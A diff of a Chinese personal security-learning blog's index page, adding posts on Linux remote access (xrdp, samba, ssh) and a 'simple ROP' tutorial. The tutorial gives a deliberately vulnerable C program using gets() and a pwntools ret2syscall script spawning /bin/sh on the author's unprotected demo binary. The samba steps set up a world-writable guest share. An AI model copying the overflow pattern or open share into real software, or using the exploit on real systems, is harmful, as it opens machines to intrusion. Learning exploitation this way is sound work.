@@ -230,6 +230,274 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-pwn-2" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/10/31/pwn-2/" class="article-date">
+      <time datetime="2018-10-31T07:24:14.000Z" itemprop="datePublished">2018-10-31</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/10/31/pwn-2/">pwn-2</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <ul>
+<li>ldd 文件名<br>看使用了什么library</li>
+</ul>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-linux-远程连接" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/10/30/linux-远程连接/" class="article-date">
+      <time datetime="2018-10-30T11:27:30.000Z" itemprop="datePublished">2018-10-30</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/10/30/linux-远程连接/">linux 远程连接</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="xrdp-模式远程连接-ubuntu12-04-16-04可用"><a href="#xrdp-模式远程连接-ubuntu12-04-16-04可用" class="headerlink" title="xrdp 模式远程连接(ubuntu12.04,16.04可用)"></a>xrdp 模式远程连接(ubuntu12.04,16.04可用)</h2><ul>
+<li><p>首先安装 <strong>xrdp</strong>，<strong>tightvncserver</strong></p>
+</li>
+<li><p>然后在Dash中找到<strong>Desktop Sharing</strong>，打开并设置</p>
+</li>
+</ul>
+<p><img src="https://i.imgur.com/UJFd9jA.png" alt=""></p>
+<ul>
+<li>打开本机电脑(win10)找到自带远程桌面控制，输入虚拟机ip</li>
+</ul>
+<p><img src="https://i.imgur.com/FVrHxyJ.png" alt=""></p>
+<ul>
+<li>选择sesman-Xvnc模式，然后输入ubuntu账号密码即可</li>
+</ul>
+<h3 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h3><p><a href="https://jingyan.baidu.com/article/5225f26baf6cf3e6fa0908e5.html（发现可以不用安装dconf-editor）" target="_blank" rel="noopener">https://jingyan.baidu.com/article/5225f26baf6cf3e6fa0908e5.html（发现可以不用安装dconf-editor）</a></p>
+<h2 id="samba-模式远程连接"><a href="#samba-模式远程连接" class="headerlink" title="samba  模式远程连接"></a>samba  模式远程连接</h2><ul>
+<li><p>首先安装 <strong>samba</strong></p>
+</li>
+<li><p>建立一个要共享文件的目录 例如/home/android/share</p>
+</li>
+<li><p>给这目录添加权限 （sudo chmod 777 /home/android/share）</p>
+</li>
+</ul>
+<h3 id="修改-etc-samba-smb-conf配置"><a href="#修改-etc-samba-smb-conf配置" class="headerlink" title="修改/etc/samba/smb.conf配置"></a>修改<strong>/etc/samba/smb.conf</strong>配置</h3><ul>
+<li>[share] # 该共享的共享名 </li>
+<li>path = /home/android/share # 共享路径 </li>
+<li>guest ok = yes 其实和public是一样的 </li>
+<li>available = yes # 设置该共享目录是否可用 </li>
+<li>browseable = yes # 设置该共享目录是否可显示 </li>
+<li>public = yes # 指明该共享资源是否能给游客帐号访问</li>
+<li>writable = yes # 可写</li>
+</ul>
+<h3 id="win10远程连接连接"><a href="#win10远程连接连接" class="headerlink" title="win10远程连接连接"></a>win10远程连接连接</h3><p><img src="https://i.imgur.com/ClFsVFq.png" alt=""></p>
+<h3 id="设置好samba-但是win10无法连接时设置"><a href="#设置好samba-但是win10无法连接时设置" class="headerlink" title="设置好samba 但是win10无法连接时设置"></a>设置好samba 但是win10无法连接时设置</h3><p><img src="https://i.imgur.com/viYQMfN.png" alt=""></p>
+<h2 id="ssh模式连接"><a href="#ssh模式连接" class="headerlink" title="ssh模式连接"></a>ssh模式连接</h2><p>参考网站：<a href="https://www.cnblogs.com/ArsenalfanInECNU/p/5594117.html" target="_blank" rel="noopener">https://www.cnblogs.com/ArsenalfanInECNU/p/5594117.html</a></p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-简单ROP" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/10/07/简单ROP/" class="article-date">
+      <time datetime="2018-10-07T08:54:01.000Z" itemprop="datePublished">2018-10-07</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/10/07/简单ROP/">简单ROP</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">int c()</span><br><span class="line">&#123;</span><br><span class="line">	char buf[100];</span><br><span class="line">	gets(buf);</span><br><span class="line">	puts(buf);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">	c();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>并没有开aslr 和其他保护<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2></li>
+<li>利用gcc生成32位的可bufferflow的.elf文件</li>
+<li>接着利用ROPgadget –binary 来寻找gadget</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&quot;./Demo2&quot;)</span><br><span class="line">par=0x080b7f86</span><br><span class="line">pcr=0x080de66d</span><br><span class="line">pbdr=0x0806edd9</span><br><span class="line">binsh=0xffffce8c</span><br><span class="line">int0x80=0x80b6c98</span><br><span class="line">offset=112</span><br><span class="line">payload=&apos;/bin/sh&apos;.ljust(offset)+p32(par)+p32(11)+p32(pbdr)+p32(binsh)+p32(0)+p32(pcr)+p32(0)+p32(int0x80)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<ul>
+<li>其中寻找/bin/sh的值可以用searchmem来找到</li>
+</ul>
+<ul>
+<li>生成静态 无栈保护 32位文件例子 gcc -g  Demo2.c -o Demo2  -fno-stack-protector -m32 -static</li>
+<li>ROPgadget –binary Demo2 &gt; gadgets –depth 20 （默认深度10）</li>
+</ul>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="w-believeme" class="article article-type-w" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/09/19/believeme/" class="article-date">
+      <time datetime="2018-09-19T14:50:30.000Z" itemprop="datePublished">2018-09-19</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/09/19/believeme/">believeme</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-Linux语法基础" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -566,242 +834,6 @@
       
         <p class="article-more-link">
           <a  href="/2018/07/05/爬坑之路--BIN(三)--5/#more">大航海 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-爬坑之路-BIN(二)--3" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/07/04/爬坑之路-BIN(二)--3/" class="article-date">
-      <time datetime="2018-07-04T02:38:41.000Z" itemprop="datePublished">2018-07-04</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/07/04/爬坑之路-BIN(二)--3/">爬坑之路--BIN(二)--3</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <p>二进制之坑….</p>
-          
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-        <p class="article-more-link">
-          <a  href="/2018/07/04/爬坑之路-BIN(二)--3/#more">大航海 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-爬坑之路--WEB(二)--2" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/07/03/爬坑之路--WEB(二)--2/" class="article-date">
-      <time datetime="2018-07-03T12:55:50.000Z" itemprop="datePublished">2018-07-03</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/07/03/爬坑之路--WEB(二)--2/">爬坑之路--WEB(二)--2</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <p>学习使我快乐…..得把<br>
-          
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-        <p class="article-more-link">
-          <a  href="/2018/07/03/爬坑之路--WEB(二)--2/#more">大航海 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-爬坑之路--WEB(一)--2" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/07/03/爬坑之路--WEB(一)--2/" class="article-date">
-      <time datetime="2018-07-03T02:24:40.000Z" itemprop="datePublished">2018-07-03</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/07/03/爬坑之路--WEB(一)--2/">爬坑之路--WEB(一)--2；</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <p>今天的我在谷底为自己又挖了一铲….<br>
-          
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-        <p class="article-more-link">
-          <a  href="/2018/07/03/爬坑之路--WEB(一)--2/#more">大航海 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-爬坑之路--BIN(一)--1" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/07/01/爬坑之路--BIN(一)--1/" class="article-date">
-      <time datetime="2018-07-01T14:04:36.000Z" itemprop="datePublished">2018-07-01</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/07/01/爬坑之路--BIN(一)--1/">爬坑之路--BIN(一)--1.md</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <p><strong>第一天我仿佛就已经掉到了谷底…</strong></p>
-          
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-        <p class="article-more-link">
-          <a  href="/2018/07/01/爬坑之路--BIN(一)--1/#more">大航海 >></a>
         </p>
       
       <div class="clearfix"></div>
